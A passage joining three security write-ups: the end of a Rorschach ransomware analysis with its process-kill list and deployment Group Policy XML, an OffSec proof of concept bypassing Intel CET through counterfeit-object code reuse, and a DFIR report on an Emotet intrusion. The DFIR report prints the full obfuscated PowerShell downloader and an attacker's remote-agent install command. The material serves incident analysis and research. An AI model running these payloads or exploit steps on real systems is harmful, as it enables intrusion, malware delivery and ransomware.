ExplorerMozillaMozilla FirefoxNETLOGONntldrntuser.datNTUSER.DATntuser.dat.logntuser.dat.
LOG1ntuser.dat.
LOG2ntuser.iniOperaOpera SoftwarePoliciesProgram
FilesProgram Files (x86)ProgramDatascriptsSYSVOLthumbs.dbTor BrowserWindowsWINDOWSWindows.oldThe
following is a list of process names that during Rorschach’s execution these names are compared to those running on the machine and killed if matched.
This is done through a combination of CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, OpenProcess, and TerminateProcess.
There is some overlap and redundancy to the list of services killed via the service control manager. AcronisAgentAcrSch2Svcagntsvc.exeBackExecRPCServicebackupBackupExecAgentAcceleratorBackupExecDiveciMediaServiceBackupExecJobEnginebedbgCAARCUpdateSvcccEvtMgrCulserverdbeng50.exedbeng8dbsnmp.exedbsrv12.exeDefWatchencsvc.exeexcel.exefirefox.exeinfopath.exeIntuit.
FCSisqlplussvc.exememtasmepocsmsaccess.exeMSExchangemsftesql-Exchangemsmdsrvmspub.exeMSSQLmydesktopqos.exemydesktopservice.exeocautoupds.exeocomm.exeocssd.exeonenote.exeoracle.exeoutlook.exePDVFSServicepowerpnt.exeQBCFMonitorServiceQBFCServiceQBIDPServiceSavRoamsophossqbcoreservice.exesql.exesqladhlpSQLADHLPsqlagentSQLAgentSQLAgent$SHAREPOINTSQLBrowserSQLWritersteam.exesynctime.exetbirdconfig.exethebat.exethunderbird.exetomcat6veeamVeeamDeploymentServiceVeeamNFSSvcVeeamTransportSvcvisio.exevmware-convertervmware-usbarbitator64WinSAT.exewinword.exewordpad.exewrapper.exeWSBExchangexfssvccon.exeYooBackupAppendix C – Group Policies executed by Rorschach Transferring its own files to each workstation: <Files clsid="{215B2E53-57CE-475c-80FE-9EEC14635851}"> <File clsid="{50BE44C8-567A-4ed1-B1D0-9234FE1F38AF}" name="0305_winutils.dll" status="0305_winutils.dll" image="2" changed="2023-03-05 08:51:22" uid="{3F490769-A341-4220-90A3-51964B4A0C12}" bypassErrors="1"> <Properties action="U" fromPath="\\**REDACTED**\sysvol\**REDACTED**.local\scripts\winutils.dll" targetPath="%Public%\winutils.dll" readOnly="0" archive="1" hidden="0" suppress="0" /> </File> <File clsid="{50BE44C8-567A-4ed1-B1D0-9234FE1F38AF}" name="0305_config.ini" status="0305_config.ini" image="2" changed="2023-03-05 08:51:22" uid="{F513F283-3C66-4C71-9B9B-4CE9BBFCEEF1}" bypassErrors="1"> <Properties action="U" fromPath="\\**REDACTED**.local\sysvol\**REDACTED**.local\scripts\config.ini" targetPath="%Public%\config.ini" readOnly="0" archive="1" hidden="0" suppress="0" /> </File> <File clsid="{50BE44C8-567A-4ed1-B1D0-9234FE1F38AF}" name="0305_cy.exe" status="0305_cy.exe" image="2" changed="2023-03-05 08:51:22" uid="{0A16D469-2648-4849-99C8-95D1B777D59A}" bypassErrors="1"> <Properties action="U" fromPath="\\**REDACTED**.local\sysvol\**REDACTED**.local\scripts\cy.exe" targetPath="%Public%\cy.exe" readOnly="0" archive="1" hidden="0" suppress="0" /> </File> </Files> 
Executing a scheduled task to run the attack: <TaskV2 clsid="{D8896631-B747-47a7-84A6-C155337F3BC8}" name="2_0305_cy.exe" image="2" changed="**REDACTED**" uid="{3772E17D-6354-4DF1-A73B-8868AC352B23}"> <Properties action="U" name="2_0305_cy.exe" runAs="%LogonDomain%\%LogonUser%" logonType="InteractiveToken"> <Task version="1.2"> <RegistrationInfo> <Author>**REDACTED**\Administrador</Author> <Description></Description> </RegistrationInfo> <Principals> <Principal id="Author"> <UserId>%LogonDomain%\%LogonUser%</UserId> <LogonType>InteractiveToken</LogonType> <RunLevel>HighestAvailable</RunLevel> </Principal> </Principals> <Settings> <IdleSettings> <Duration>PT10M</Duration> <WaitTimeout>PT1H</WaitTimeout> <StopOnIdleEnd>false</StopOnIdleEnd> <RestartOnIdle>false</RestartOnIdle> </IdleSettings> <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy> <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries> <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries> <AllowHardTerminate>true</AllowHardTerminate> <AllowStartOnDemand>true</AllowStartOnDemand> <Enabled>true</Enabled> <Hidden>false</Hidden> <ExecutionTimeLimit>P3D</ExecutionTimeLimit> <Priority>7</Priority> </Settings> <Triggers> <RegistrationTrigger> <Enabled>true</Enabled> </RegistrationTrigger> <LogonTrigger> <Enabled>true</Enabled> </LogonTrigger> </Triggers> <Actions Context="Author"> <Exec> <Command>%Public%\cy.exe</Command> <Arguments>--run=**REDACTED**</Arguments> </Exec> </Actions> </Task> </Properties> </TaskV2> 
title: Bypassing Intel CET with Counterfeit Objects | OffSec url: https://www.offsec.com/offsec/bypassing-intel-cet-with-counterfeit-objects/ Bypassing Intel CET with Counterfeit Objects Matteo Malvica Content Developer Since its inception in 2005, return-oriented programming (ROP) has been the predominant avenue to thwart W^X mitigation during memory corruption exploitation. 
While Data Execution Prevention (DEP) has been engineered to block plain code injection attacks from specific memory areas, attackers have quickly adapted and instead of injecting an entire code payload, they resorted in reusing multiple code chunks from DEP-allowed memory pages, called ROP gadgets.
These code chunks are taken from already existing code in the target application and chained together to resemble the desired attacker payload or to just disable DEP on a per page basis to allow the existing code payloads to run. 
To permanently block ROP attacks, a new hardware-enforced Control Flow Integrity mitigation called Control Enforcement Technology (CET) has been developed by Intel and first shipped on Windows systems roughly two years ago. 
At first, the advent of CET painted a bleak picture future for exploit developers and their reliance on ROP-based techniques.
However, in 2015, a new code-reuse technique named Counterfeit Object-Oriented Programming (COOP) has been formulated in a paper which seemed quite promising in defeating Control-Flow Integrity (CFI) defenses. 
In this blog, we’ll briefly cover how CFI mitigations works, including CET, and how we can leverage COOP to effectively bypass Intel CET on the latest Windows releases. 
Forward-Edge and Backward-Edge CFI Control Flow Integrity mechanisms can be grouped into two main categories: forward-edge and backward-edge. 
Forward-edge CFI, like Microsoft CFG, protects indirect function calls through the use of verified function addresses.
For instance, if we overwrite the pointer dereferenced in a CALL [rax] instruction with a ROP gadget address, CFG will block our exploit by throwing an exception. 
Conversely, backward-edge CFI like Intel’s CET protects a function’s return address by comparing it to a previously saved version of the address that is stored on the Shadow Stack.
If the original return address gets overwritten during a memory corruption exploit, the address comparison will inevitably fail and the application will be terminated.
Given that ROP-based attacks execute “RET” instructions without a prior “CALL” instruction, the running thread’s stack and the shadow stack values mismatch and so backward-edge CFI like CET effectively blocks this attack technique. 
Intel CET has been designed to mitigate ROP attacks through both the Shadow Stack and COP/JOP via Indirect Branch Tracking (IBT).
However since the latter technology has not yet been implemented on Windows, in this blog post we are going to refer to “Intel CET” as the implementation with only Shadow Stack enabled. 
CET internals have been documented extensively in previous researches [6][7] and we have already demonstrated how the mitigation works and on which major software CET has been deployed.
At the time of this writing the landscape hasn’t changed much and every major browser continues to run CET on every process except the renderer process.
This means that the way CET is currently implemented is quite ineffective because the renderer process is the one that gets typically exploited. 
Even though CET is still not widely enforced on browsers we should expect it to be enforced on every process over the coming years.
To avoid getting caught unprepared, as researchers, we should improve our tradecraft and constantly learn about newly developed attack angles.
Additionally, no matter how impeding a mitigation might be, we need to broaden our horizon if we want to find any weaknesses. 
Counterfeiting Objects As mentioned in this post’s premise, a novel code reuse technique named Counterfeit Object-Oriented Programming or COOP has been put together by Felix Schuster in 2015.
We should note that this paper is quite theoretical.
The technique has not been observed implemented in the wild or in disclosed exploits.
Our goal for this blog post is to try to leverage this theoretical approach and implement it in a proof of concept in order to bypass Intel CET. 
The main idea behind this technique is counterfeiting – that is crafting new objects in-memory from attacker-controlled payloads and to chain them together through virtual functions that are already present in the target application or in loaded libraries. 
Each virtual function contained in a counterfeit object is called a vfgadget and is responsible for performing a small task.
Similarly to ROP, vfgadgets can perform tasks like populating a value into a register.
However when grouped together, multiple vfgadgets can execute more advanced operations. 
As no specific tools exist today to discover vfgadgets, they can be found through custom scripts such as IDAPython, using a process similar to ROP gadget discovery. 
Since vfgadgets are picked from a pool of CFG-valid functions we can mark them as legitimate, and their execution will not be blocked by CFG once we hijack an indirect call with one of them. 
In addition, an interesting corollary is that Intel CET won’t be triggered since we won’t corrupt any function return address during the process of calling vfgadgets in sequence. 
As illustrated in Schuster’s paper, a typical COOP payload begins with a foundational vfgadget that acts as the COOP’s main function.
We’ll refer to it as Looper in this blog post.
Once the attacker has assembled the counterfeit object in memory, the Looper vfgadget iterates over an array of other vfgadgets, carefully prearranged by the attacker, which will be invoked one by one.
By aligning the vfgadgets in the counterfeit object in such a way, we’ll be able to call valid virtual functions in a controlled manner. 
Once the Looper is running, it can then call other vfgadgets that are responsible for executing specific operations, like Argument LoadersInvokers and Collectors.
These vfgadgets will be stored at regular intervals within the the array accessed by the Looper. 
An Argument Loader vfgadget populates a given register by loading a value into it.
The value to be loaded will be stored inside the counterfeit object at an offset from the beginning of the fake object. 
Once the registers are populated by one or more Argument Loaders, an Invoker vfgadget can be called to simply execute the function pointer of the target API. 
Collectors are gadgets that retrieve a value already present in a register, and save it back into the attacker’s counterfeit object (i.e. as a returned value from an invoked API). 
The following graph sum-up the COOP attack strategy discussed so far. 
COOP attack flow We can arrange and mix different vfgadgets based on their availability and the desired APIs that we want to execute. 
In order to better understand a COOP attack, let’s start by analyzing the main vfgadget, the Looper.
The following assembly code provides a simplified version of a Looper COOP vfgadget: mov rbx, [rcx+0x40] loop_start: mov rax, [rbx] call cs:__guard_dispatch_icall_fptr mov rbx, [rbx+20h] test rbx, rbx jnz short loop_start ... 
loop_exit: ret Looper Gadget relevant ASM code On the first line, RCX holds the this pointer and we load into RBX the start of the counterfeit object that has been placed at offset 0x40 from RCX.
Since all the items in our counterfeit objects will be referenced at offsets from thethis pointer, we need to make sure to save its value before hijacking the program flow (i.e by corrupting a vtable). 
The COOP payload base address is then dereferenced into RAX which points to the first vfgadget that gets called.
Once the call returns, a new vfgadget is loaded at offset 0x20 from the previous gadget and if the content of RBX is not zero, a new iteration of the loop takes place. 
While writing our counterfeit object in memory, we need to align upfront each vfgadget to match the Looper offsets, similarly to the following layout: 
The COOP buffer in memory Here, 00000227`26cd8900 is the base address of our COOP payload, which is stored at offset 0x40 from the this pointer (RCX).
From the previous code listing, we notice at the first line of the _loopstart routine that the pointer gets dereferenced into RAX, which in turn points to the first vfgadget.
On the next loop iteration the Looper repeats the same task by loading a pointer at offset 0x20 from the previous one and ultimately invokes the second vfgadget. 
When exploiting real-world targets such browsers, it is recommended to rely on the Looper vfgadget because it gives more control and stability over the other vfgadgets.
However, for the sake of brevity, we wrote our vulnerable application with only a single Invoker vfgadget which accepts one argument, as we’ll see in the next section. 
Having covered introductory COOP theory, let’s move on to exploiting a CET-compiled proof of concept application that we developed to showcase COOP attacks. 
Bypassing the CET Shadow Stack with COOP The vulnerable application we wrote is compiled with CET and CFG in addition to DEP, which is on by default. 
First off, to verify that CET is really enforced, we place a breakpoint on printf, inspect the call-stack, overwrite the return address and resume execution. 
0:000> bp printf 0:000> g 0:000> k # Child-SP RetAddr Call Site 00
00000000`0014fde8
00000001`400180e8 coop!printf
[C:\Program Files (x86)\Windows Kits\10\Include\10.0.19041.0\ucrt\stdio.h @ 956] 01 00000000`0014fdf0
00000001`40018d54 coop!main+0x28
[C:\Users\uf0\source\repos\COOP\COOP\coop.cpp @ 54] 02 (Inline Function) --------`-------- coop!invoke_main+0x22
[D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 78] 03 00000000`0014fef0 00007ffb`ec0a7034 coop!__scrt_common_main_seh+0x10c
[D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 288] 04 00000000`0014ff30 00007ffb`ecba2651 KERNEL32!BaseThreadInitThunk+0x14 05
00000000`0014ff60
00000000`00000000
ntdll!RtlUserThreadStart+0x21 0:000> dq 00000000`0014fde8 L1 00000000`0014fde8
00000001`400180e8 0:000> eq 00000000`0014fde8
414141414141 0:000> dq 00000000`0014fde8 L1 00000000`0014fde8 00004141`414141411 0:000>
g (16c0.f68): Security check failure or stack buffer overrun - code c0000409 (!!!
second chance !!!) 
Subcode: 0x39 FAST_FAIL_CONTROL_INVALID_RETURN_ADDRESS Shadow stack violation coop!printf+0x56: 00000001`400187e6 c3 ret Verifying that CET is enforced We get confirmation that CET is enabled as we are immediately prompted with a Shadow Stack exception referring to an invalid return address. 
As CET is a hardware-enforced mitigation, in order to trigger the above error we would need at least an 11th Generation Core ‘Tiger Lake’ CPU To simulate a browser vulnerability, we can obtain RIP control by taking advantage of a type confusion vulnerability in the application that is triggered automatically when the application is executed. 
When we hit the trigger for the vulnerability, a vtable pointer gets corrupted by our input, leading to an indirect call that we have control over.
We then hijack the vtable to make it point to our COOP buffer where our first (and only) vfgadget resides.
As mentioned earlier, instead of using a Looper with nested vfgadget, for the sake of brevity, we opted to use a single gadget that features both the Invoker and Argument Loader components. 
As part of the automated part of the exploit, in order to obtain the vfgadget’s this pointer, we have leaked the stack pointer and retrieved the this pointer as a static offset from the stack. 
Once we have obtained the this pointer address, we prepare the address of the Windows API we want to invoke along with its arguments.
This is done by writing both the Windows API address and the arguments at the required offsets inside the counterfeit object. 
Before exploring the COOP payload in more detail, let’s first understand the PoC’s syntax by running it without any arguments. 
C:\Users\offsec\source\repos\COOP\x64\Debug>coop.exe [-] SYNTAX: coop.exe <
COOP obj ptr> <1st vfgadget> <WinAPI> <API argument> 
[-] EXAMPLE - WinExec: coop.exe 00001e000000 5086014001000000 40610fecfb7f0000 "cmd.exe /C calc" [-] EXAMPLE - LoadLibraryA: coop.exe 00001e000000
5086014001000000 f0040becfb7f0000 "edgehtml.dll" Getting the PoC’s syntax The application accepts four parameters: a pointer to our counterfeit object (COOP) buffer, the vfgadget address, the Windows API address and its arguments.
The helper shows two simple use-cases but this can be of course expanded to invoke any CFG-allowed API (if the application is compiled with it). 
Since Windows DLLs will load at a random base address, it is required to calculate the desired API’s address beforehand. 
Let’s first inspect the C++ code of the object related to our vfgadget, and then explore its corresponding assembly from the compiled binary: class OffSec { public: char* a; int (*callback)(char* a); 
public: virtual void trigger(char* a1) { callback(a); } }; The ‘trigger’ method from which we derive the vfgadget The class OffSec present in the project contains a trigger method which acts as a C-style function pointer that we can abuse to invoke any API we like, as we’ll see shortly.
Then, the ‘OffSec’ class is instantiated in the main program routine so it gets loaded in memory along with its methods. 
Taking a closer look at the Invoker in the disassembler reveals a few interesting aspects. 
Invoker vfgadger Starting from the second to the fourth line, the this pointer, referenced by RCX, is first stored on the stack and then moved into RAX.
Next, the value at offset 0x10 from RAX is dereferenced and moved into RAX.
This value will be the API function pointer residing in our counterfeit object.
Then at line 7 and 8 the first function argument is dereferenced at offset 0x8 from the this pointer and moved into RCX. 
As we’ll soon discover, the vulnerable application will take care of these offsets once we have submitted the parameters from the command line. 
Having covered the main building blocks of our attack chain, let’s try to run the PoC by passing the four arguments in order to gain code execution: C:\> coop.exe 00001e000000
5086014001000000 40610fecfb7f0000 "cmd.exe /C calc" Running the PoC application with all parameters With the above command we provided the following parameters:00001e000000 as a storage buffer for our counterfeit object,5086014001000000 as the Invoker vfgadget in addition to40610fecfb7f0000 which is the WinExec memory address. 
As a final argument we pass the WinExec string argument.
Note that all memory addresses are passed in little-endian format. 
Once started, the application halts immediately, allowing us to attach the debugger to it.
Before doing so, we launch Process Explorer to verify that the binary is actually running with Intel CET enabled. 
Verifying that CET is enabled with Process Explorer Under the “Stack Protection” column, Process Explorer confirms that CET is enforced for only the CET-compatible modules, meaning that the mitigation will be enforced for any module compiled with CET.
This includes our application. 
Once the debugger is attached, we place a breakpoint to the only indirect call present in the main function and continue execution. 
0:001> bp 00000001`4001847e 0:001>
bl 0 e
Disable Clear 00000001`4001847e 0001 (0001) 0
:**** coop!main+0x3d2 0:001> u 00000001`4001847e L1 coop!main+0x3d2: 00000001`4001847e ff159cbb0a00 call qword ptr
[coop!__guard_dispatch_icall_fptr (00000001`400c4020)] 0:000> dq 0x1e0000 L1 00000000`001e0000 00000001`400186a0 0:001>
g Breaking at the Indirect Call We placed a breakoint at main+0x3d2 and verified that we have indeed an indirect call at that address.
Next we dump the content of our counterfeit object located at the static address 0x1e0000, which holds a pointer to our vfgadget at 00000001400186a0 At main+0x3d2 is where the type confusion bug ignites and allows us to take control over RIP.
As soon as we hit the breakpoint we inspect the value residing at our COOP buffer, which should be the first Invoker vfgadget.
We let the application continue and verify that we indeed hit our breakpoint. 
Breakpoint 0 hit coop!main+0x3d2: 00000001`4001847e ff159cbb0a00 call qword ptr [coop!__guard_dispatch_icall_fptr (00000001`400c4020)] ds:00000001`400c4020={ntdll!LdrpDispatchUserCallTarget (00007ffb`ecbdc620)} 0:000>t ntdll!LdrpDispatchUserCallTarget: 
00007ffb`ecbdc620 4c8b1d814d0f00 mov r11,qword ptr [ntdll!LdrSystemDllInitBlock+0xb8 (00007ffb`eccd13a8)]
ds:00007ffb`eccd13a8=00007df600000000 0:000> ntdll!LdrpDispatchUserCallTarget+0x23: 00007ff8`7c5fc643 48ffe0 jmp rax {coop!OffSec::trigger (00000001`400186a0)} ... 
0:000> coop!OffSec::trigger: 00000001`400186a0 4889542410 mov qword ptr
[rsp+10h],rdx ss:00000000`0014fdf8=0000000000612b77 Landing on the first COOP vfgadget After tracing into the CFG LdrpDispatchUserCallTarge routine
we jump to the Invoker vfgadget ‘OffSec::trigger”, proving that we have control over the program’s execution flow.
We then continue tracing inside the vfgadget: 
0:000> t ... coop!OffSec::trigger+0x5: 
00000001`40018655 48894c2408 mov qword ptr
[rsp+8],rcx ss:00000000`0014fdf0=00000001400a1108 0:000> dq rcx L1 
00000000`00590d80 00000000`001e0000 0:000> t coop!OffSec::trigger+0xa: 
00000001`4001865a 4883ec38 sub rsp,38h 0:000> coop!OffSec::trigger+0xe: 00000001`4001865e 488b442440 mov rax,qword ptr [rsp+40h] ss:00000000`0014fdf0=0000000000590d80 Moving the ‘this’ pointer into RAX In the above listing, the Invoker first saves the this pointer from RCX into the stack, and we also verify that it points to the base of our COOP buffer.
On the last instruction the ‘this’ pointer is loaded into RAX, which will be used as a reference to invoke the API and its argument: 0:000> 
coop!OffSec::trigger+0x13: 00000001`40018663 488b4010 mov rax,qword ptr [rax+10h] ds:00000000`00590d90={KERNEL32!WinExec (00007ffb`ec0f6140)} 0:000> 
coop!OffSec::trigger+0x17: 00000001`40018667 4889442420 mov qword ptr [rsp+20h],rax ss:00000000`0014fdd0=000000000000001f 0:000> coop!OffSec::trigger+0x1c: 00000001`4001866c 488b442440 mov rax,qword ptr [rsp+40h] ss:00000000`0014fdf0=0000000000590d80 0:000> coop!OffSec::trigger+0x21: 00000001`40018671 488b4808 mov rcx,qword ptr [rax+8] ds:00000000`00590d88=00000000001e0080 0:000> dc 00000000001e0080 00000000`001e0080 
2e646d63 20657865 6320432f 00636c61 cmd.exe /C calc. ... 
Loading WinExec parameters from the ‘this’ pointer First, at offset 0x10 we can see that WinExec address is loaded into RAX and then, three instructions later, the command parameter gets retrieved at offset 0x8. 
Once we let execution continue, we invoke LdrpDispatchUserCallTarget again which in turn dispatches execution to WinExec and welcomes us with our calculator. 
Successfully Calling WinExec 
This completes our brief proof-of-concept where we demonstrated that we can bypass the Intel CET Shadow Stack and obtain arbitrary code execution via a COOP attack by calling CFG-allowed functions while simultaneously avoiding corrupting any return address. 
The Visual Studio project for this PoC application can be found at the following URL. 
Conclusions Intel CET provides yet another strong defensive mechanism that surely steps up the exploit development game.
Nonetheless, new attack pathways such as COOP can be adopted to circumvent this mitigation.
As we learned so far, COOP vfgadgets are inherently allowed by CFG and so, in a real-world scenario they could be chained together to circumvent Intel CET and possibly other CFI mitigations. 
About The Author Matteo Malvica Content Developer Matteo Malvica is a content developer at Offensive Security focusing on vulnerability research, exploit development, reverse engineering and operating system internals. 
title: Emotet Strikes Again - LNK File Leads to Domain Wide Ransomware -
The DFIR Report url: https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/ 
In June of 2022, we observed a threat actor gaining access to an environment via Emotet and operating over a eight day period.
During this time period, multiple rounds of enumeration and lateral movement occurred using Cobalt Strike.
Remote access tools were used for command and control, such as Tactical RMM and Anydesk.
The threat actors final actions included data exfiltration using Rclone and domain wide deployment of Quantum Ransomware. 
We have observed similar traits in previous cases where Emotet and Quantum were seen. 
Case Summary The intrusion began when a user double clicked a LNK file, which then executed encoded Powershell commands to download an Emotet DLL onto the computer.
Once executed, Emotet setup a Registry Run Key to maintain persistence on the beachhead host. 
Emotet, then proceeded to execute a short list of discover commands using the Windows utilities systeminfo, ipconfig, and nltest targeting the network’s domain controllers.
These commands would go on to be repeated daily by the Emotet process.
Around one and one-half hours after execution, Emotet began sending spam emails, mailing new malicious attachments to continue spreading. 
Similar activity continued over the second day, but on the third day of the incident, Emotet dropped a Cobalt Strike executable beacon onto the beachhead host.
Using the Cobalt Strike beacon, the threat actors began conducting a new round of discovery activity.
Windows net commands were run, targeting domain groups and computers, nltest was executed again, and they also used tasklist and ping to investigate a remote host. 
The threat actor then moved laterally to a workstation.
They first attempted this action using a PowerShell beacon and a remote service on the host, but while the script did execute on the remote host, it appeared to fail to connect to the command and control server.
Next, they proceeded to transfer a beacon executable over SMB to the remote host’s ProgramData directory.
This beacon was then successfully executed via WMI and connected successfully to the threat actors server. 
Once on this new host the threat actors proceeded to run the net commands to review the Domain Administrators group again.
They then proceeded to dump credentials from the LSASS process on the host.
With some further process injection they then began to enumerate SMB shares across the environment and on finding a primary file server reviewed several documents present on the server.
This Cobalt Strike server stopped communicating shortly there after. 
On the fourth day of the intrusion, Emotet dropped a new Cobalt Strike beacon.
Again, some net command discovery was run for domain admins and domain controller servers.
A flight of netlogon authentications were observed from the beachhead host to the domain controller as a possible attempt at exploiting the domain controller. 
The threat actors, however, proceeded along a more traditional path, using SMB file transfers and remote services to move laterally across domain controllers and several other servers in the environment using Cobalt Strike beacon DLL’s.
On the domain controller, the threat actors conducted further discovery tasks running find.bat and p.bat, which executed AdFind active directory discovery and performed a ping sweep across the environment. 
On one of the other targeted servers, the threat actors deployed Tactical RMM, a remote management agent, for additional access and persistence in the environment.
From this server, the threat actors were observed using Rclone to exfiltrate data from a file share server in the environment.
The Mega.io service was the location the stolen data was sent. 
On the fifth day of the intrusion, the threat actors appeared again to try and exfiltrate some data from the mail server again using Rclone but this appeared to fail and the threat actors did not try to resolve the issue.
After this the threat actors went silent until the eighth and final day of the intrusion. 
On the eighth day of the intrusion the threat actor accessed the environment using Tactical RMM to deploy Anydesk on the compromised host.
After establishing a connection using Anydesk, the threat actors then dropped SoftPerfect’s Network Scanner and ran it to identify hosts across the environment. 
From there, the threat actors began connecting to other hosts via RDP, including the a backup server.
After choosing a new server and connecting via RDP, the threat actors dropped Powertool64.exe and dontsleep.exe in preparation for their final actions.
Finally, locker.dll and a batch file 1.bat were dropped on the host and the batch file was executed beginning the Quantum rasomware deployment to all hosts over SMB.
From initial intrusion to ransomware deployment, 154 hours passed, over eight days. 
After ransomware deployment, the threat actors remained connected and did RDP to a few other servers and executed ProcessHacker.exe and a net command.
With no other activity taking place, we assess that this was likely the threat actors confirming successful deployment of the ransomware payload across the network. 
Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc.
More information on this service and others can be found here. 
Both of the Cobalt Strike servers in this case were on our Threat Feed (days to months) in advance of this intrusion. 
We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services. 
Timeline Report Lead: @iiamaleksAnalysis and reporting: @samaritan_o, and @yatinwad Initial Access Initial access took the form of an LNK file delivered to a victim through a MalSpam campaign. 
The Powershell script embedded within the LNK is a Base64 encoded script with various components split into different variables for obfuscation purposes.
The script will decode itself rather than depend on Powershell’s built-in ability to execute encoded scripts. ..
\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "&{'p8ArwZsj8ZO+Zy/dHPeI+siGhbaxtEhzwmd3zVObm9uG2CGKqz5m4AdzKWWzPmKrjJieG4O9';$BxQ='uYnIvc3RhdHMvUkppMnJRSTRRWHJXQ2ZnZG1pLyIsImh0dHBzOi8vd3d3LmVsYWJvcm8ucGwvaW1ncy9KWkgyR0lIdG9PNy8iLCJodHRwczovL2 VsLWVuZXJnaWFraS5nci93cC1pbmNsdWRlcy9JZHJWS09HWU1Rb2R1N0lsT0loLyIsImh0dHA6Ly9kcmVjaHNsZXJzdGFtbXRpc2NoLmRlL2ZvbnRzL1pBeVhic2YvIiwiaHR0cDovL2RobmNvbnN0cnVjY2lvbmVzLmNvbS5hci93cC1hZG1pbi9TbTAyWnNWRFlXZG9UYjdycUw vIiwiaHR0cDovL2RpbHNybC5jb20vcGhvbmUvcGZpcDVtLyIpOyR0PSJuZldGUSI7JGQ9IiRlbnY6VE1QXC4uXCR0Ijtta2RpciAtZm9yY2UgJGQgfCBvdXQtbnVsbDtmb3JlYWNoICgkdSBpbiAkbGlua3MpIHt0cnkge0lXUiAkdSAtT3V0RmlsZSAkZFxqeEtQSXJNRnhKLk9P ZjtSZWdzdnIzMi5leGUgIiRkXGp4S1BJck1GeEouT09mIjticmVha30gY2F0Y2ggeyB9fQ==';$KOKN='ICBXcml0ZS1Ib3N0ICJBcFBoUiI7JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cHM6Ly9kZXNjb250YWRvci5jb20';$KO KN=$KOKN+$BxQ;$GBUus=$KOKN;$xCyRLo=[System.Text.Encoding]::ASCII.GetString([System.
Convert]::FromBase64String($GBUus));$GBUus=$xCyRLo;iex($GBUus)}" The Powershell script, when double clicked (executed), will attempt to connect to a set of domains containing the Emotet malware.
Upon successful download of the Emotet malware, the PowerShell script will write it to a temporary directory and execute the payload via regsvr32.exe. 
It is interesting to note, the LNK identifies the machine it was created on through the NetBIOS name of black-dog and a MAC Address beginning with 08:00:27 indicating a system running on Virtualbox. 
Machine ID: black-dog MAC Address: 08:00:27:c6:74:5d MAC Vendor: PCS SYSTEMTECHNIK Creation: 2022-05-12 15:33:49 Execution Once the PowerShell script from the LNK file executed successfully
, Emotet began execution.
Emotet will initially copy itself to a randomly named folder in the users temporary folder. 
Multiple instances of Emotet spawning itself was observed over a period of three days.
Almost all the instances of Emotet included three enumeration commands executed: systeminfo ipconfig /all 
nltest /dclist: Towards the third and fourth day of the intrusion, Cobalt Strike was dropped to disk as a PE executable and executed.
This access was used to perform enumeration and move laterally to other hosts. 
The following diagram aims to provide an illustration of the execution chain with multiple instances of Emotet leading to Cobalt Strike. 
Persistence The Emotet malware has used various persistence methods over time, an example can be seen here. 
On the first day, Emotet established persistence via a run key. 
As we can see, the regsvr32.exe Windows’s native utility was used to launch the Emotet DLL. 
After moving to the hands on keyboard phase of the intrusion, the threat actors proceeded to deploy several remote management tools across the environment.
Tactical RMM was the first tool chosen for deployment.
Tactical RMM is a remote management software platform that uses a combination of agents to allow for remote management and access to systems. 
The file 17jun.exe, was deployed into the programdata folder on one of the servers.
This was then executed by the threat actors and resulted in the installation of the main RMM agent.
The install completed with the following command. 
"C:\Program Files\TacticalAgent\tacticalrmm.exe" -m install --api https://api.floppasoftware[.]com --client-id 1 --site-id 1 --agent-type server --auth 5bc5f5263224697ff9a653f8efa7e7d7a2ce341920a03c60e4823331b2508c 
A service was also created for the agent. 
Event 7045A service was installed in the system.
Service Name: TacticalRMM Agent ServiceService File Name: "C:\Program Files\TacticalAgent\tacticalrmm.exe"
-m svcService Type: user mode serviceService Start Type: auto startService Account:
LocalSystem Along with the tacticalrmm.exe client, a second executable called meshagent.exe, was installed to handle remote session interaction, and a separate service was created for that agent. 
Service Name: Mesh AgentService File Name: "C:\Program Files\Mesh Agent\MeshAgent.exe"Service Type: user mode serviceService Start Type: auto startService Account:
LocalSystem On the final day of the intrusion, the threat actors added AnyDesk to the same server running Tactical RMM, providing an additional means of access prior to the deployment of ransomware. 
Service Name: AnyDesk ServiceService File Name: "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --serviceService
Type: user mode serviceService Start Type: auto startService Account:
LocalSystem Privilege Escalation We suspect a failed ZeroLogon exploit was attempted against a domain controller, originating from the beachhead host with Cobalt Strike running on it.
One indicator is the ‘mimikatz’ string in the Netlogon event that is used by the Mimikatz Zerologon implementation. 
During a period of a few seconds, multiple NetrServerReqChallenge and NetrServerAuthenticate2 methods in the traffic from a single source were observed, this is one of the indicators of a Zerologon attempt. 
Defense Evasion Process Injection The threat actor was observed process injecting into legitimate process and using them to execute their own tasks on the system, this can be seen from Winlogon connecting to a domain associated with a Cobalt Strike server and removing files from the system. 
The specific mechanism used to inject into a foreign process, was injecting arbitrary code into its memory space, and executing it as a remotely created thread.
This occurred from rundll32.exe, which was previously used to execute and run Cobalt Strike. 
The following table summarizes the processes used for injection during this case: Injected Process Name Injection Payload C:\Windows\system32\winlogon.exe Cobalt Strike C:\Windows\System32\RuntimeBroker.exe Cobalt Strike C:\Windows\System32\svchost.exe Cobalt Strike C:\Windows\System32\taskhostw.exe Cobalt Strike C:\Windows\system32\dllhost.exe Cobalt Strike PowerTool PowerTool was observed, dropped and executed on the server used to deploy the ransomware payload.
This tool has the ability to kill a process, delete its process file, unload drivers, and delete the driver files.
It has been reportedly used by several ransomware groups to aid in their operations [1][2][3][4]. 
As a byproduct of execution, PowerTool will drop a driver to disk and load it into the system. 
Driver Signature Name:
北京华林保软件技术有限公司 Indicator Removal The threat actor was observed deleting files that had been dropped to disk. 
Credential Access Process access to LSASS was observed, likely to dump credentials from a process that was injected with Cobalt Strike.
The Granted Access level matches know indicators for Mimikatz with an access value of 0x1010 (4112), as we covered in a prior report. 
